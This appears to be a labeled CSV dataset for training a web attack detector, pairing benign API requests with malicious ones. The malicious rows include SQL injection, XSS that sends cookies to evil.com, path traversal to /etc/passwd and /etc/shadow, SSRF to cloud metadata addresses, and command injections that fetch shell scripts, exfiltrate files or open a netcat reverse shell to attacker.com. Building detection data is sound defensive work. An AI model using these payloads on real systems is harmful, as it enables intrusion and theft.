"text","label"
"name=Omar email=736@mail.com","0"
"category=laptops page=1","0"
"title=<iframe src=javascript:alert(1)>","1"
"username=admin&password=letmein","1"
"GET /api/data/1598","0"
"search=headphones","0"
"1'/**/OR/**/1=1--","1"
"user=ahmed&filter=active","0"
"POST /api/data body=command$(whoami)","1"
"url=http://localhost:8080","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Authorization: Bearer validtoken787","0"
"include=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"title=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"Authorization: Bearer validtoken412","0"
"order_id=ORD-2703 status=confirmed","0"
"url=dict://127.0.0.1:11211/","1"
"username=root&password=admin","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"POST /api/products User-Agent: python-requests/2.31.0","0"
"file=....//....//etc/passwd","1"
"order_id=ORD-6355 status=confirmed","0"
"Authorization: Bearer validtoken113","0"
"GET /api/swagger.json HTTP/1.1","1"
"login attempt failed username admin invalid credentials","1"
"GET /web.config HTTP/1.1","1"
"POST /profile User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"category=tablets page=4","0"
"PUT /dashboard?category=electronics&page=1","0"
"page=8&limit=20","0"
"order_id=' OR 1=1#","1"
"cmd=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"url=http://metadata.google.internal","1"
"GET /api/users?id=1'||'1'='1","1"
"order_id=ORD-8964 status=confirmed","0"
"order_id=ORD-9215 status=confirmed","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken182","0"
"user_id=292&action=view","0"
"exec=|| nc -e /bin/sh attacker.com 4444","1"
"' UNION ALL SELECT NULL,NULL,NULL--","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"GET /phpmyadmin HTTP/1.1","1"
"POST /api/feedback body=<img src='x' onerror='alert(1)'>","1"
"GET /api/data/689","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"order_id=ORD-2787 status=confirmed","0"
"user_id=532&action=view","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=laptop","0"
"exec=; ls -la","1"
"GET ../../../var/www/html/config.php","1"
"fetch=http://internal-service:8080/secret","1"
"Authorization: Bearer validtoken523","0"
"GET /wp-admin HTTP/1.1","1"
"DELETE /profile?status=pending&priority=high","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Authorization: Bearer validtoken430","0"
"url=http://192.168.1.1","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /.git/config HTTP/1.1","1"
"repeated authentication failure admin account locked","1"
"order_id=ORD-6170 status=confirmed","0"
"DELETE /api/data User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"GET /dashboard/4184","0"
"Authorization: Bearer validtoken495","0"
"GET /backup.sql HTTP/1.1","1"
"include=../../../etc/shadow","1"
"page=4&limit=20","0"
"User-Agent: Nmap Scripting Engine","1"
"filename=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"repeated authentication failure admin account locked","1"
"GET /profile/1275","0"
"POST /api/feedback body=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"message=<svg/onload=alert(1)>","1"
"category=electronics&page=1","0"
"username=administrator&password=qwerty","1"
"GET /phpmyadmin HTTP/1.1","1"
"file=../../../.env","1"
"GET /backup.sql HTTP/1.1","1"
"exec=; python -c 'import socket,subprocess'","1"
"Authorization: Bearer validtoken755","0"
"POST /api/login body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"repeated authentication failure admin account locked","1"
"url=file:///etc/passwd","1"
"host=| uname -a","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"search=headphones","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /health HTTP/1.1","0"
"user=admin'--","1"
"url=dict://127.0.0.1:11211/","1"
"login attempt failed username admin invalid credentials","1"
"ping=| cat /etc/passwd","1"
"login attempt failed username admin invalid credentials","1"
"GET /admin HTTP/1.1","1"
"..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"category=laptops page=9","0"
"Authorization: Bearer validtoken604","0"
"q=smartphone&brand=samsung","0"
"cmd=; ls -la","1"
"POST /settings?date=2024-01-15&type=order","0"
"POST /api/data body=command; cat /etc/shadow","1"
"GET /health HTTP/1.1","0"
"user=admin'--","1"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"GET /health HTTP/1.1","0"
"name=Nour email=633@mail.com","0"
"GET /settings/2664","0"
"host=& ipconfig","1"
"GET /api/swagger.json HTTP/1.1","1"
"POST /api/data body=command& whoami","1"
"name=Ahmed email=120@mail.com","0"
"search=laptop","0"
"filename=& net user hacker Password1 /add","1"
"GET /api/files?name=/etc/passwd%00","1"
"login attempt failed username admin invalid credentials","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /wp-admin HTTP/1.1","1"
"GET /robots.txt scan probe reconnaissance","1"
"id=') OR ('1'='1","1"
"user_id=880&action=view","0"
"exec=$(curl -s http://attacker.com/shell.sh)","1"
"Authorization: Bearer validtoken725","0"
"GET /api/search/1431","0"
"Authorization: Bearer validtoken302","0"
"DELETE /api/search?date=2024-01-15&type=order","0"
"POST /settings body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"exec=| cat /etc/passwd","1"
"include=..%2F..%2F..%2Fetc%2Fpasswd","1"
"url=gopher://127.0.0.1:25/","1"
"name=Sara email=924@mail.com","0"
"host=`curl -s http://attacker.com/shell.sh | bash`","1"
"cmd=`id`","1"
"POST /api/orders body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET ../../../../etc/shadow","1"
"brute force attempt on login endpoint from single ip","1"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"message='><script>alert(1)</script>","1"
"POST /api/products?category=electronics&page=1","0"
"path=../../../etc/shadow","1"
"username=root&password=admin","1"
"GET /api/swagger.json HTTP/1.1","1"
"GET /server-status HTTP/1.1","1"
"user_id=598&action=view","0"
"path=....//....//etc/passwd","1"
"GET /api/data/6593","0"
"GET ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"file=../../../../var/log/apache2/access.log","1"
"GET /health HTTP/1.1","0"
"id=123&format=json","0"
"brute force attempt on login endpoint from single ip","1"
"POST /api/orders?limit=20&offset=0","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/login?category=electronics&page=1","0"
"POST /api/products body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"user_id=370&action=view","0"
"Authorization: Bearer validtoken846","0"
"login attempt failed username admin invalid credentials","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=16&limit=20","0"
"POST /api/data body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /config.php HTTP/1.1","1"
"order_id=ORD-6538 status=confirmed","0"
"User-Agent: Nikto/2.5.0","1"
"name=Lina email=143@mail.com","0"
"user_id=268&action=view","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"user_id=932&action=view","0"
"url=file:///etc/passwd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"page=22&limit=10","0"
"GET /api/products/1764","0"
"GET /profile/7309","0"
"' OR 'x'='x","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"order_id=ORD-5132 status=confirmed","0"
"POST /api/login User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"search=' UNION SELECT NULL--","1"
"page=13&limit=50","0"
"Authorization: Bearer validtoken757","0"
"POST /settings body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/login User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"url=file:///etc/passwd","1"
"GET /api/search/8999","0"
"category=tablets page=10","0"
"user_id=811&action=view","0"
"GET /profile?limit=20&offset=0","0"
"POST /api/data body=command| wget http://attacker.com/shell.sh","1"
"url=http://localhost:8080","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"file=../../../../var/log/apache2/access.log","1"
"User-Agent: Nmap Scripting Engine","1"
"order_id=ORD-9365 status=confirmed","0"
"url=http://10.0.0.1","1"
"id=123&format=json","0"
"DELETE /profile User-Agent: python-requests/2.31.0","0"
"GET /health HTTP/1.1","0"
"order_id=' UNION SELECT NULL,NULL--","1"
"GET /health HTTP/1.1","0"
"category=tablets page=4","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"password spray attack detected multiple users","1"
"user_id=673&action=view","0"
"cmd=; ls -la","1"
"category=audio page=7","0"
"page=29&limit=20","0"
"q=smartphone&brand=samsung","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"search=tablet","0"
"GET /actuator/env HTTP/1.1","1"
"page=41&limit=50","0"
"page=3&limit=20","0"
"POST /api/search?user=ahmed&filter=active","0"
"username=admin&password=monkey","1"
"date=2024-01-15&type=order","0"
"user_id=209&action=view","0"
"GET /robots.txt scan probe reconnaissance","1"
"url=gopher://127.0.0.1:25/","1"
"multiple failed login attempts detected for admin","1"
"GET /etc/passwd%00","1"
"`curl -s http://attacker.com/shell.sh | bash`","1"
"GET /api/search?q=<iframe src=javascript:alert(1)>","1"
"GET /health HTTP/1.1","0"
"user=ahmed&filter=active","0"
"search=<div onmouseover=alert(1)>hover</div>","1"
"cmd=& net user hacker Password1 /add","1"
"host=; ls -la","1"
"path=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"url=http://192.168.1.1","1"
"category=audio page=4","0"
"DELETE /api/login?q=smartphone&brand=samsung","0"
"<div onmouseover=alert(1)>hover</div>","1"
"search=laptop","0"
"search=phone","0"
"search=laptop","0"
"url=http://127.0.0.1/admin","1"
"Authorization: Bearer validtoken548","0"
"category=tablets page=9","0"
"password spray attack detected multiple users","1"
"GET /wp-admin HTTP/1.1","1"
"include=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"url=http://localhost:8080","1"
"GET /api/search?q=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"GET /api/orders/4745","0"
"repeated authentication failure admin account locked","1"
"user_id=199&action=view","0"
"category=audio page=1","0"
"category=tablets page=1","0"
"GET /phpmyadmin HTTP/1.1","1"
"multiple failed login attempts detected for admin","1"
"PUT /settings?search=laptop&sort=price","0"
"GET /profile User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"password spray attack detected multiple users","1"
"order_id=1' AND 1=1 UNION SELECT 1-- -","1"
"GET /api/files?name=../../../../proc/self/environ","1"
"search=tablet","0"
"category=audio page=2","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"user=1 AND SLEEP(5)--","1"
"GET /api/login/9882","0"
"POST /profile body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /api/products/2271","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"user_id=51&action=view","0"
"search=phone","0"
"search=';alert(String.fromCharCode(88,83,83))//","1"
"GET /api/orders/7697","0"
"GET /config.php HTTP/1.1","1"
"GET /api/users/6240","0"
"url=http://metadata.google.internal","1"
"PUT /api/login User-Agent: python-requests/2.31.0","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Nour email=817@mail.com","0"
"POST /api/login username=1 UNION SELECT 1,2,3-- password=test","1"
"q=smartphone&brand=samsung","0"
"1' OR '1'='1' /*","1"
"' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"comment=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"name=Lina email=86@mail.com","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"filename=& ipconfig","1"
"POST /settings body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"username=1' OR 0x31=0x31--","1"
"username=1'||'1'='1","1"
"GET /phpmyadmin HTTP/1.1","1"
"page=39&limit=20","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /api/products?date=2024-01-15&type=order","0"
"search=laptop&sort=price","0"
"search=laptop","0"
"PUT /api/search?limit=20&offset=0","0"
"order_id=1 OR 1=1","1"
"POST /api/data User-Agent: python-requests/2.31.0","0"
"user_id=476&action=view","0"
"url=http://192.168.1.1","1"
"name=Sara email=976@mail.com","0"
"<scr ipt>alert(1)</scr ipt>","1"
"GET /health HTTP/1.1","0"
"POST /api/data body=command|| nc -e /bin/sh attacker.com 4444","1"
"page=8&limit=10","0"
"PUT /api/login User-Agent: python-requests/2.31.0","0"
"file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"include=....//....//etc/passwd","1"
"user_id=710&action=view","0"
"cmd=; ls -la","1"
"url=http://127.0.0.1/admin","1"
"url=file:///etc/passwd","1"
"GET /api/data/2431","0"
"ping=; ping -c 4 attacker.com","1"
"GET /settings User-Agent: axios/1.6.0","0"
"user_id=425&action=view","0"
"Authorization: Bearer validtoken190","0"
"DELETE /api/search?limit=20&offset=0","0"
"username=admin&password=batman","1"
"GET /api/data?search=laptop&sort=price","0"
"DELETE /profile?id=123&format=json","0"
"filename=; python -c 'import socket,subprocess'","1"
"GET ../../.git/config","1"
"GET /health HTTP/1.1","0"
"GET /api/files?name=../../../../var/log/apache2/access.log","1"
"category=electronics&page=1","0"
"search=headphones","0"
"include=..%2F..%2F..%2Fetc%2Fpasswd","1"
"search=phone","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"page=49&limit=50","0"
"name=Sara email=919@mail.com","0"
"url=http://192.168.1.1","1"
"name=Nour email=35@mail.com","0"
"category=tablets page=1","0"
"search=tablet","0"
"1'/**/OR/**/1=1--","1"
"search=<svg onload=alert(1)>","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"name=Ahmed email=203@mail.com","0"
"path=../../.git/config","1"
"GET /api/orders/9774","0"
"GET /robots.txt scan probe reconnaissance","1"
"category=tablets page=2","0"
"include=../../../etc/shadow","1"
"name=Lina email=5@mail.com","0"
"q=smartphone&brand=samsung","0"
"order_id=ORD-5420 status=confirmed","0"
"GET /phpmyadmin HTTP/1.1","1"
"ping=| cat /etc/passwd","1"
"order_id=ORD-1647 status=confirmed","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"password spray attack detected multiple users","1"
"host=; python -c 'import socket,subprocess'","1"
"password spray attack detected multiple users","1"
"GET /config.php HTTP/1.1","1"
"GET /api/files?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"../../../../etc/passwd","1"
"GET /api/search?search=laptop&sort=price","0"
"include=../../../../etc/passwd","1"
"username=administrator&password=batman","1"
"filename=& whoami","1"
"POST /api/search?category=electronics&page=1","0"
"GET /robots.txt scan probe reconnaissance","1"
"1'; EXEC xp_cmdshell('whoami')--","1"
"GET /actuator/env HTTP/1.1","1"
"name=<body onload=alert(1)>","1"
"page=6&limit=10","0"
"User-Agent: Nmap Scripting Engine","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"login attempt failed username admin invalid credentials","1"
